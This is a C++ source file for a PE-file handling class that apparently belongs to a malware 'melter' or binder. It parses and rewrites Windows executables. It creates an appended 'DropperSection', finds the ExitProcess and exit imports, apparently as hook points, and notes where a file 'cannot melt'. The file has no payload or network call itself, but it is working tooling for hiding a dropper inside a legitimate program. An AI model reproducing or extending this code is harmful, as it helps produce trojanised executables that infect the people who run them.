#include <algorithm>
#include <cctype>
#include <iomanip>
#include <iostream>
#include <string>
using namespace std;

#include "common.h"
//#include <Wintrust.h>

#include "DropperSection.h"
#include "ResourceSection.h"
#include "FileBuffer.h"
#include "PEObject.h"
#include "XRefNames.h"
#include "retcodes.h"

PEObject::PEObject(char* data, std::size_t size)
: _rawData(data), _fileSize(size), _eofData(NULL), _sectionHeadersPadding(NULL), 
	_hasManifest(false), _exitProcessIndex(0), _exitIndex(0), _boundImportTable(NULL)
{
}

PEObject::~PEObject(void)
{
	if (_eofData) {
		delete _eofData;
	}
}

bool PEObject::parse()
{
	assert(_rawData);
	
	cout << "Parsing PE." << endl;
	
	if (_parseDOSHeader() == false)
		return false;
	
	if (_parseNTHeader() == false)
		return false;
	
	std::string kernel32dll("KERNEL32.DLL");
	std::string exitProcess("EXITPROCESS");
	_exitProcessIndex = this->_findCall(kernel32dll, exitProcess); // _findExitProcessIndex();
	cout << "ExitProcess @ " << _exitProcessIndex << endl;
	std::string msvCrtDll("MSVCRT.DLL");
	std::string exit("EXIT");
	_exitIndex = this->_findCall(msvCrtDll, exit); //_findExitIndex();
	cout << "Exit @ " << _exitIndex << endl;
	
	if ( ! _manifest.empty())
		cout << "MANIFEST: " << endl << _manifest << endl;
	
	return true;
}

bool PEObject::_parseDOSHeader()
{
	this->_dosHeader.header = (IMAGE_DOS_HEADER*)this->_rawData;
	
	if( this->_dosHeader.header->e_magic != IMAGE_DOS_SIGNATURE ) {
		cout << "Invalid DOS header signature" << endl;
		return false;
	}
	
	this->_dosHeader.stub_size = this->_dosHeader.header->e_lfanew - sizeof(IMAGE_DOS_HEADER);
	this->_dosHeader.stub = this->_rawData + sizeof(IMAGE_DOS_HEADER);
	
	return true;	
}

#if 0
bool PEObject::isAuthenticodeSigned()
{
	// check if file is Authenticode signed

	DWORD certificate_table = 0;
	certificate_table = this->_ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress;
	if ( certificate_table && certificate_table < _fileSize) {
		WIN_CERTIFICATE* wincert = (WIN_CERTIFICATE*) ((DWORD)this->_rawData + certificate_table);

		/*
		cout << "Cert Revision : " << hex << wincert->wRevision << endl;
		cout << "Cert Type     : " << hex << wincert->wCertificateType;
		if (wincert->wCertificateType == 0x0002)
			cout << " (Authenticode)";
		cout << endl;
		*/

		return true;
	}

	return false;
}
#endif

bool PEObject::_parseNTHeader()
{
	_ntHeader = (IMAGE_NT_HEADERS*) _resolveOffset(_dosHeader.header->e_lfanew);
	if (_ntHeader == NULL) {
		cout << "Invalid PE header offset." << endl;
		return false;
	}
	
	// signature
	if( _ntHeader->Signature != IMAGE_NT_SIGNATURE ) 
	{
		cout << "Invalid NT header signature" << endl;
		return false;
	}
	
	// check if executable is Win32 PE for IA-32
	if ( _ntHeader->FileHeader.Machine != IMAGE_FILE_MACHINE_I386 
		&& _ntHeader->OptionalHeader.Subsystem != IMAGE_SUBSYSTEM_WINDOWS_GUI)
	{
		cout << "Executable is not for IA-32 Win32 systems." << endl;
		return false;
	}
	
	/*
	// data directory
	*/
	// CHECK FOR BOUND IMPORT TABLE, IF PRESENT WE CANNOT MELT
	
	if (_ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].VirtualAddress)
	{
		return false;

		/*
		cout << "BOUND IMPORT TABLE FOUND" << endl;
		
		DWORD offset = _rvaToOffset(_ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].VirtualAddress);
		_boundImportTableSize = _ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].Size;
		
		_boundImportTable = new BYTE[_boundImportTableSize];
		if (_boundImportTable)
			memcpy(_boundImportTable, _rawData + offset, _boundImportTableSize);
		*/
	}
	
	/*
	// sections
	*/
	cout << "File has " << _ntHeader->FileHeader.NumberOfSections << " sections" << endl;
	
	IMAGE_SECTION_HEADER *sectionHeader  = NULL;
	
	sectionHeader = (IMAGE_SECTION_HEADER *)_resolveOffset(_dosHeader.header->e_lfanew + sizeof(IMAGE_NT_HEADERS));
	if (sectionHeader == NULL)
		return false;
	
	std::size_t firstSectionOffset = 0xffffffff;
	
	for ( DWORD iC = 0; iC < _ntHeader->FileHeader.NumberOfSections ; iC++ )
	{
		// create a new section object
		GenericSection* section = new GenericSection(*this, (char*)sectionHeader->Name, _ntHeader->OptionalHeader.FileAlignment, sectionHeader);
		
		// add section to list
		_sections.push_back(section);
		
		// reading from file
		section->SetFilePointer(_rawData, sectionHeader->SizeOfRawData);
		
		// update first section offset
		if (section->PointerToRawData() != 0 && section->PointerToRawData() < firstSectionOffset)
			firstSectionOffset = section->PointerToRawData();
		
		// file validity heuristics
		// check if size of sections is > file size
		if (section->SizeOfRawData() > _fileSize) {
			cout << "INVALID PE: raw size of section " << iC << " is greater than file size." << endl;
			return false;
		}

		/*
		cout << "Section " << iC << endl;
		cout << "\tVirtualAddress  : 0x" << right << std::setw(8) << std::setfill('0') << hex << section->VirtualAddress() + this->_ntHeader->OptionalHeader.ImageBase << endl;
		cout << "\tPointerToRawData: 0x" << std::setw(8) << std::setfill('0') << hex << section->PointerToRawData() << endl;
		cout << "\tSizeOfRawData   : 0x" << std::setw(8) << std::setfill('0') << hex << section->SizeOfRawData() << endl;
		cout << endl;
		*/
		
		sectionHeader++;
	}
	
	// cout << "First section offset: 0x" << std::setw(8) << std::setfill('0') << hex << firstSectionOffset << endl;
	
	// check if there is some padding between section headers and sections data
	std::size_t sectionHeadersSize = sizeof(IMAGE_SECTION_HEADER) * _sections.size();
	std::size_t sectionHeadersOffset = _dosHeader.header->e_lfanew + sizeof(IMAGE_NT_HEADERS);
	
	if (sectionHeadersOffset + sectionHeadersSize < firstSectionOffset) {
		_sectionHeadersPaddingSize = firstSectionOffset - (sectionHeadersOffset + sectionHeadersSize);
		_sectionHeadersPadding = _rawData + sectionHeadersOffset + sectionHeadersSize;
	}
	
	// check for EOF data
	
	sectionHeader--;
	if (sectionHeader->PointerToRawData + sectionHeader->SizeOfRawData < _fileSize) {
		_eofData = new GenericSection(*this, ".EOF",  _ntHeader->OptionalHeader.FileAlignment);
		_eofData->setEof(true);
		_eofData->SetData(_rawData 
			+ _sections[_sections.size() - 1]->PointerToRawData() 
			+ _sections[_sections.size() - 1]->SizeOfRawData(), _fileSize - (sectionHeader->PointerToRawData + sectionHeader->SizeOfRawData));
		_eofData->SetVirtualAddress(_sections[_sections.size() - 1]->VirtualAddress() 
			+ _sections[_sections.size() - 1]->VirtualSize());
		_eofData->SetSizeOfRawData( _fileSize - (sectionHeader->PointerToRawData + sectionHeader->SizeOfRawData));
		_eofData->SetVirtualSize(sectionHeader->SizeOfRawData);
	}
	
	return true;
}

bool PEObject::saveToFile(std::string filename)
{
	/*
	DWORD size = 0;
	
	if (_eofData) {
		size = _eofData->header->PointerToRawData + _eofData->header->SizeOfRawData;
	} else {
		size = _sections[_sections.size() - 1]->PointerToRawData() + _sections[_sections.size() - 1]->SizeOfRawData();
	}
	
	if (size <= 0)
		return false;
	*/
	
	try {
		std::ofstream outfile(filename.c_str(), ios::out | ios::binary);
		
		_ntHeader->FileHeader.NumberOfSections = _sections.size();
		
		/*** fix SizeOfImage ***/
		_ntHeader->OptionalHeader.SizeOfImage = 
			_sections[_sections.size() - 1]->VirtualAddress() + _sections[_sections.size() - 1]->VirtualSize();
		
		/*** write DOS header ***/
		cout << "Writing DOS Header @ 0x" << right << setfill('0') << setw(8) << hex << outfile.tellp() << endl;
		outfile.write( reinterpret_cast<char*>(_dosHeader.header) , sizeof(IMAGE_DOS_HEADER) );

		/*** write DOS stub ***/
		cout << "Writing DOS Stub @ 0x" << setfill('0') << setw(8) << hex << outfile.tellp() << endl;
		outfile.write( _dosHeader.stub , _dosHeader.stub_size );
		
		/*** write NT headers ***/
		cout << "Writing NT Header @ 0x" << setfill('0') << setw(8) << hex << outfile.tellp() << endl;
		outfile.write(reinterpret_cast<char*>(_ntHeader), sizeof(IMAGE_NT_HEADERS32) );
		
		/*** copy section headers ***/
		for (std::size_t i = 0; i < _sections.size(); i++) {
			cout << "Writing Section " << i << " Header @ 0x" << setfill('0') << setw(8) << hex << outfile.tellp() << endl;
			outfile.write(reinterpret_cast<char*>(_sections[i]->Header()), sizeof(IMAGE_SECTION_HEADER));
		}
		
		/*** copy padding data, if present ***/
		/*
		if (_sectionHeadersPadding) {
			cout << "Writing Section Headers padding @ 0x" << setfill('0') << setw(8) << hex << outfile.tellp() << endl;
			outfile.write(_sectionHeadersPadding, _sectionHeadersPaddingSize);
		}
		*/
		
		/* move pointer to beginning of first section data */
		std::streampos pos = 0xFFFFFFFF;
		for (std::size_t i = 0; i < _sections.size(); i++) {
			if (_sections[i]->PointerToRawData() != 0 && _sections[i]->PointerToRawData() < (DWORD)pos)
				pos = _sections[i]->PointerToRawData();
		}
		outfile.seekp(pos);
		
		/*** copy sections data ***/
		for (std::size_t i = 0; i < _sections.size(); i++) {
			cout << "Writing Section " << i << " data @ 0x" << setfill('0') << setw(8) << hex << outfile.tellp() << "[" << _sections[i]->SizeOfRawData() << "]" << endl;
			// cout << "DATA " << (DWORD)_sections[i]->data() << endl;
			char*  data = _sections[i]->data();
			size_t size = _sections[i]->SizeOfRawData();
			
			if (data && size > 0)
				outfile.write(data, size);
			while (0) ;
		}
		
		/*** copy EOF data ***/
		if (_eofData) {
			cout << "Writing EOF data @ 0x" << setfill('0') << setw(8) << hex << outfile.tellp() << endl;
			outfile.write(_eofData->data(), _eofData->SizeOfRawData());
		}
		
		outfile.close();
		cout << "Writing done." << endl;
	} catch ( iostream::failure &e) {
		cout << "Error writing on filesystem [" << e.what() << "]" << endl;
		return false;
	}
	
	return true;
}

DropperSection * PEObject::createDropperSection(string name)
{
	DropperSection* section = new DropperSection(*this, name, _ntHeader->OptionalHeader.FileAlignment);
	appendSection(section);
	
	return section;
}

DWORD PEObject::_rvaToOffset( DWORD rva )
{
	BOOL bFound = FALSE;
	DWORD iC = 0;

	// TODO resolving offsets NOT IN SECTIONS will not work!!!
	
	for ( iC = 0; iC < _sections.size() ; iC++ )
	{
		DWORD VA = _sections[iC]->VirtualAddress();
		DWORD PRAW = _sections[iC]->PointerToRawData();
		DWORD SRAW = _sections[iC]->SizeOfRawData();
		if( VA /* && rva >= VA */ && rva <= ( VA + SRAW ) ) 
		{
			if (PRAW)
				return (rva + PRAW - VA);
			else
				return rva;
		}
	}
	
	return 0;
}

GenericSection* PEObject::getSection( DWORD directoryEntryID )
{
	std::vector<GenericSection *>::iterator iter = _sections.begin();
	
	DWORD rva = _ntHeader->OptionalHeader.DataDirectory[directoryEntryID].VirtualAddress;
	
	for (; iter != _sections.end(); iter++) 
	{
		GenericSection* section = *iter;
		if (section->VirtualAddress() == rva)
			return section;
	}
	
	return NULL;
}

int PEObject::_findCall(std::string& dll, std::string& call)
{
	DWORD importTableRva = _ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
	IMAGE_IMPORT_DESCRIPTOR * descriptor = (IMAGE_IMPORT_DESCRIPTOR*) (_rvaToOffset(importTableRva) + _rawData);

	while (descriptor->FirstThunk != 0) 
	{
		char* name = (char*) (_rvaToOffset(descriptor->Name) + _rawData);

		cout << "Imported DLL: " << name << endl;

		// uppercase dllname
		string dllName = name;
		int (*pf)(int) = std::toupper;
		std::transform(dllName.begin(), dllName.end(), dllName.begin(), pf);

		if (dllName.compare(dll) != 0) {
			descriptor++;
			continue;
		}

		UINT_PTR dwOriginalThunk = (descriptor->OriginalFirstThunk ? descriptor->OriginalFirstThunk : descriptor->FirstThunk);
		IMAGE_THUNK_DATA const *itd = (IMAGE_THUNK_DATA *)(_rawData + _rvaToOffset(dwOriginalThunk));
		UINT_PTR dwThunk = descriptor->FirstThunk;
		DWORD Thunks = (DWORD) (_rvaToOffset(descriptor->OriginalFirstThunk != 0 ?
			descriptor->OriginalFirstThunk : descriptor->FirstThunk) + (DWORD) _rawData);

		int i = 0;
		while (itd->u1.AddressOfData)
		{
			if (itd->u1.Ordinal & IMAGE_ORDINAL_FLAG) 
			{
				cout << "\tOrdinal: %08X\n" << itd->u1.Ordinal - IMAGE_ORDINAL_FLAG << endl;
				itd++;
				Thunks += sizeof(DWORD);
				continue;
			}

			IMAGE_IMPORT_BY_NAME const * name = (IMAGE_IMPORT_BY_NAME const *) (_rvaToOffset( itd->u1.AddressOfData ) + _rawData);
			cout << "\tName: " << (char*)(name->Name) << endl;

			string callName = (char*) name->Name;
			int (*pf)(int) = std::toupper;
			std::transform(callName.begin(), callName.end(), callName.begin(), pf);

			if (callName.compare(call) != 0) {
				i++;
				itd++;
				Thunks += sizeof(DWORD);
				continue;
			}

			return i;
		}

		return -1;
	}

	return -1;
}
